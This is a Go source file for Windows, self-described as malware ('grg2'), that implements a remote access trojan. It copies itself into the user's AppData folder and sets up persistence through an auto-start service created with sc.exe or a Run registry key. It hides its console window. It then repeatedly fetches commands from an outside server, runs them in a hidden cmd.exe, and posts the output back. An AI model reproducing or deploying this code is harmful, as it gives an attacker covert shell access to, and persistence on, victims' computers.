package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
)

var (
	modShell32        = syscall.NewLazyDLL("shell32.dll")
	procIsUserAnAdmin = modShell32.NewProc("IsUserAnAdmin")
)

var (
	kernel32DLL      = windows.NewLazySystemDLL("kernel32.dll")
	user32DLL        = windows.NewLazySystemDLL("user32.dll")
	getConsoleWindow = kernel32DLL.NewProc("GetConsoleWindow")
	showWindow       = user32DLL.NewProc("ShowWindow")
)

const (
	SW_HIDE          = 0 // Hide the window
	SW_SHOW          = 5 // Show the window
	GWL_EXSTYLE      = -20
	WS_EX_APPWINDOW  = 0x00040000
	WS_EX_TOOLWINDOW = 0x00000080
)

const malwareName = "grg2"

type myService struct{}

func (m *myService) Execute(args []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {

	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	tick := time.Tick(5 * time.Second)

	status <- svc.Status{State: svc.StartPending}

	status <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

loop:
	for {
		select {
		case <-tick:
			log.Print("Tick Handled...!")
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				status <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				log.Print("Shutting service...!")
				break loop
			case svc.Pause:
				status <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				status <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
				log.Printf("Unexpected service control request #%d", c)
			}
		}
	}

	status <- svc.Status{State: svc.StopPending}
	return false, 1
}

func runService(name string, isDebug bool) {
	if isDebug {
		err := debug.Run(name, &myService{})
		if err != nil {
			log.Fatalln("Error running service in debug mode.")
		}
	} else {
		go work()
		err := svc.Run(name, &myService{})
		if err != nil {
			log.Fatalln("Error running service in Service Control mode.")
		}
	}
}

func isAdmin() bool {
	// Call the Windows API function IsUserAnAdmin
	ret, _, _ := procIsUserAnAdmin.Call()
	return ret != 0
}

func getCurrentDir() string {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error: ", err)
		return err.Error()
	}
	dir := filepath.Dir(exePath)

	return dir
}
func getEnvVar(varName string) string {
	varValue := os.Getenv(varName)
	if varValue == "" {
		fmt.Printf("Error: " + varName + " does not exist")
		return ""
	}
	return varValue
}

func checkInstall() string {
	appDataDir := getEnvVar("APPDATA")

	currentExePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error finding executable path. Error: ", err)
		return ""
	}
	exeFilename := filepath.Base(currentExePath)

	homeDir := filepath.Join(appDataDir, malwareName)

	if getCurrentDir() != homeDir {
		fmt.Println("No installation... Installing...")
		if _, err := os.Stat(homeDir); os.IsNotExist(err) {
			err := os.MkdirAll(homeDir, os.ModePerm)
			if err == nil {
				fmt.Println("Sucessfully created home dir: " + homeDir)
				fmt.Println("Copying...")

				newExeFilePath := filepath.Join(homeDir, exeFilename)

				copyFileContents(currentExePath, newExeFilePath)

				if isAdmin() {
					fmt.Println("Detected permissions: ADMINISTRATOR")
					fmt.Println("Creating automatic startup service")

					fmt.Println("Deleting leftovers if any")
					cmd := exec.Command("sc.exe", "stop", malwareName)
					cmd.Stdout = os.Stdout
					cmd.Stdin = os.Stdin
					cmd.Run()
					cmd = exec.Command("sc.exe", "delete", malwareName)
					cmd.Stdout = os.Stdout
					cmd.Stdin = os.Stdin
					cmd.Run()

					fmt.Println("Creating service")
					cmd = exec.Command("sc.exe", "create", malwareName, "binPath=", newExeFilePath, "start=", "auto")
					cmd.Stdout = os.Stdout
					cmd.Stderr = os.Stderr
					err := cmd.Run()
					if err != nil {
						fmt.Println("Failed creating startup service, Error: ", err)
						return ""
					}

					fmt.Println("Starting automatic service")
					cmd = exec.Command("sc.exe", "start", malwareName)
					cmd.Stdout = os.Stdout
					cmd.Stderr = os.Stderr
					err = cmd.Run()
					if err != nil {
						fmt.Println("Failed starting the service, Error: ", err)
						return ""
					}

					// fmt.Println("Scheduling to start on login as admin")
					// cmd := exec.Command("runas", "/user:Administrator", "schtasks /create /tn "+malwareName+" /tr "+newExeFilePath+" /sc onlogon /rl highest /f")

					// output, err := cmd.CombinedOutput()
					// if err != nil {
					// 	fmt.Printf("Error creating scheduled task: %v\n", err)
					// 	fmt.Printf("Command output: %s\n", string(output))
					// 	return ""
					// }

					// fmt.Println("Scheduled task created successfully.")
					// fmt.Println(string(output))
				} else {
					fmt.Println("Detected permissions: USER")
					fmt.Println("Putting into Registry to start up on login")

					runKey := `Software\Microsoft\Windows\CurrentVersion\Run`

					// Open the registry key for writing
					key, err := registry.OpenKey(registry.CURRENT_USER, runKey, registry.SET_VALUE)
					if err != nil {
						log.Fatalf("Error opening registry key: %v", err)
					}
					defer key.Close()

					// Set the registry value (this adds the app to startup)
					err = key.SetStringValue(malwareName, newExeFilePath)
					if err != nil {
						log.Fatalf("Error setting registry value: %v", err)
					}

					fmt.Printf("Application '%s' added to startup successfully.\n", malwareName)
				}

				return newExeFilePath
			} else {
				fmt.Println("Error creating home dir in: " + homeDir)
				return ""
			}
		}
	} else {
		fmt.Println("Installation detected... Running...")
	}
	return ""
}

func work() {
	// URL endpoints for receiving commands and sending output
	// url := readFile("url.txt")
	url := "http://shratcacs.onrender.com" // your SHRATCACS server
	commandURL := url + "/get-command"
	outputURL := url + "/send-output"

	// Start the cmd.exe process
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")

	// Create pipes to communicate with cmd.exe
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Println("Error creating stdin pipe:", err)
		return
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("Error creating stdout pipe:", err)
		return
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("Error creating stderr pipe:", err)
		return
	}

	// Start cmd.exe
	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting cmd.exe:", err)
		return
	}

	// Goroutine to continuously fetch commands from the server and send to cmd.exe
	go func() {
		defer stdin.Close()
		for {
			// Make an HTTP GET request to fetch commands
			resp, err := http.Get(commandURL)
			if err != nil {
				fmt.Println("Error fetching command:", err)
				time.Sleep(5 * time.Second) // Retry after a delay if there's an error
				continue
			}

			// Read the response body (command from the server)
			command, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				fmt.Println("Error reading command:", err)
				continue
			}

			// If no command, wait and try again
			if len(command) == 0 {
				time.Sleep(2 * time.Second)
				continue
			}

			// Write the command to cmd.exe's stdin
			fmt.Println("Executing command:", string(command))
			stdin.Write(command)
		}
	}()

	// Goroutine to read cmd.exe's output and send it back to the server
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			output := scanner.Text()
			fmt.Println(output)

			// Send the output to the server
			resp, err := http.Post(outputURL, "text/plain", bytes.NewBufferString(output))
			if err != nil {
				fmt.Println("Error sending output:", err)
				continue
			}
			resp.Body.Close()
		}
		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading cmd.exe output:", err)
		}

		scanner = bufio.NewScanner(stderr)
		for scanner.Scan() {
			output := scanner.Text()
			fmt.Println(output)

			// Send the output to the server
			resp, err := http.Post(outputURL, "text/plain", bytes.NewBufferString(output))
			if err != nil {
				fmt.Println("Error sending output:", err)
				continue
			}
			resp.Body.Close()
		}
		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading cmd.exe output:", err)
		}
	}()

	// Wait for cmd.exe to finish
	if err := cmd.Wait(); err != nil {
		fmt.Println("cmd.exe finished with error:", err)
	}
}

func main() {
	isService, err := svc.IsWindowsService()
	if err != nil {
		fmt.Println("Error checking if is service: ", err)
		work()
		return
	}
	if isService {
		runService(malwareName, false)
		return
	}

	newMalwarePath := checkInstall()
	if len(newMalwarePath) != 0 {
		cmd := exec.Command(newMalwarePath)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		}
		err := cmd.Start()
		if err != nil {
			fmt.Println("Error restarting " + malwareName)
			work()
		}

		return
	}
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd == 0 {
		fmt.Println("No console window avaliable")
	} else {
		_, _, err := showWindow.Call(hwnd, SW_HIDE)
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Printf("Failed to hide console window: %v\n", err)
		}
	}
	work()
}

// helper functions

func copyFileContents(src, dst string) (err error) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return
	}
	defer func() {
		cerr := out.Close()
		if err == nil {
			err = cerr
		}
	}()
	if _, err = io.Copy(out, in); err != nil {
		return
	}
	err = out.Sync()
	return
}

func readFile(filePath string) string {
	content, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatalf("Failed to read file: %v", err)
	}
	return string(content)
}
